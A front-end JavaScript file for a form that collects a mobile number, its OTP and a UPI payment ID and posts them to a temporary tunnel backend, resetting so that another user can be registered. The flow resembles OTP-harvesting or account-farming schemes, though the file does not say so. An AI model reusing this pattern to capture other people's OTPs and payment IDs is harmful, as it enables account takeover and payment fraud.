document.addEventListener('DOMContentLoaded', () => {
    // --- CONFIGURATION ---
    // Your live backend URL is now connected.
    const API_URL = 'https://insert-atom-music-feature.trycloudflare.com/api.php';

    // --- ELEMENT REFERENCES ---
    const pages = document.querySelectorAll('.page');
    const statusMessage = document.getElementById('status-message');
    const phoneInput = document.getElementById('phoneInput');
    const otpInput = document.getElementById('otpInput');
    const upiInput = document.getElementById('upiInput');
    const displayPhone = document.getElementById('displayPhone');
    const requestOtpButton = document.getElementById('requestOtpButton');
    const verifyOtpButton = document.getElementById('verifyOtpButton');
    const submitUpiButton = document.getElementById('submitUpiButton');

    // --- HELPER FUNCTIONS ---
    function showStatus(message, type = 'info') {
        statusMessage.textContent = message;
        statusMessage.className = `status ${type}`;
    }

    function showPage(pageId) {
        pages.forEach(page => page.classList.add('hidden'));
        document.getElementById(pageId).classList.remove('hidden');
    }
    
    function setButtonLoading(button, isLoading, originalHTML) {
        if (isLoading) {
            button.dataset.originalHTML = button.innerHTML;
            button.innerHTML = `${originalHTML} <div class="loading"></div>`;
            button.disabled = true;
        } else {
            button.innerHTML = button.dataset.originalHTML;
            button.disabled = false;
        }
    }

    // --- BACKEND COMMUNICATION ---
    async function sendRequest(action, data) {
        showStatus('Processing...', 'info');
        const formData = new FormData();
        formData.append('action', action);
        for (const key in data) { formData.append(key, data[key]); }

        try {
            const response = await fetch(API_URL, { method: 'POST', body: formData });
            if (!response.ok) throw new Error(`Server Error: ${response.status}`);
            return await response.json();
        } catch (error) {
            showStatus(`Network error: Your backend might be offline.`, 'error');
            return null;
        }
    }

    // --- EVENT LISTENERS ---
    requestOtpButton.addEventListener('click', async (e) => {
        const phone = phoneInput.value.trim();
        if (phone.length !== 10 || !/^\d+$/.test(phone)) {
            return showStatus('Please enter a valid 10-digit mobile number.', 'error');
        }
        setButtonLoading(e.target, true, '<i class="fas fa-paper-plane"></i> Checking...');
        const result = await sendRequest('request_otp', { phone });
        setButtonLoading(e.target, false);

        if (result && result.status === 'success') {
            displayPhone.textContent = `+91 ${phone}`;
            showStatus(result.message, 'success');
            if (result.action === 'show_otp') {
                showPage('otp-step');
            } else if (result.action === 'show_upi') {
                showPage('upi-step');
            }
        } else if (result) {
            showStatus(result.message, 'error');
        }
    });

    verifyOtpButton.addEventListener('click', async (e) => {
        const phone = phoneInput.value.trim();
        const otp = otpInput.value.trim();
        if (otp.length < 4 || !/^\d+$/.test(otp)) {
            return showStatus('Please enter a valid OTP.', 'error');
        }
        setButtonLoading(e.target, true, '<i class="fas fa-check-circle"></i> Verifying...');
        const result = await sendRequest('verify_otp', { phone, otp });
        setButtonLoading(e.target, false);

        if (result && result.status === 'success') {
            showPage('upi-step');
            showStatus(result.message, 'success');
        } else if (result) {
            showStatus(result.message, 'error');
        }
    });

    submitUpiButton.addEventListener('click', async (e) => {
        const phone = phoneInput.value.trim();
        const upi = upiInput.value.trim();
        if (!upi.includes('@') || upi.length < 5) {
            return showStatus('Please enter a valid UPI ID (e.g., yourname@paytm).', 'error');
        }
        setButtonLoading(e.target, true, '<i class="fas fa-wallet"></i> Submitting...');
        const result = await sendRequest('submit_upi', { phone, upi });
        
        if (result && result.status === 'success') {
            e.target.innerHTML = '<i class="fas fa-check"></i> Submission Complete!';
            showStatus(result.message, 'success');
            setTimeout(() => {
                showPage('phone-step');
                phoneInput.value = '';
                otpInput.value = '';
                upiInput.value = '';
                setButtonLoading(e.target, false);
                showStatus('You can now register another user.', 'info');
            }, 2500);
        } else if (result) {
            setButtonLoading(e.target, false);
            showStatus(result.message, 'error');
        }
    });
    
    // --- VISUAL EFFECTS INITIALIZATION ---
    function createParticles() {
        const particlesContainer = document.getElementById('particles');
        if (!particlesContainer) return;
        const particleCount = 50;
        for (let i = 0; i < particleCount; i++) {
            const particle = document.createElement('div');
            particle.className = 'particle';
            const size = Math.random() * 4 + 2;
            particle.style.width = `${size}px`;
            particle.style.height = `${size}px`;
            particle.style.left = `${Math.random() * 100}%`;
            particle.style.top = `${Math.random() * 100}%`;
            particle.style.animationDelay = `${Math.random() * 6}s`;
            particle.style.animationDuration = `${Math.random() * 3 + 3}s`;
            particlesContainer.appendChild(particle);
        }
    }
    createParticles();
});